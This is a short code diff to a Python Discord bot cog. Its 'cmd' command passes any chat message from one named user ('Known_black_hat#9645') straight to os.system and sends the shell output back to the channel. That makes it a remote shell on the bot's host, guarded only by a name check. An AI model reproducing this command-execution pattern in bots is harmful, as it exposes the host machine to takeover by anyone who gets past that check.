@@ -14,7 +14,9 @@ class Oscmd(commands.Cog):
     @commands.command(name="cmd")
     async def cmd(self,ctx,*, command_string):
         if str(ctx.message.author) == "Known_black_hat#9645":
-            output = subprocess.getoutput(command_string)
+            os.system(f"{command_string} &> console.log")
+            with open('console.log','r') as f:
+                output=f.read()
             await ctx.send(embed=cr.emb(cr.green,"Console",f"```{output[:1900]}```"))
         else:
             raise 'command not found'
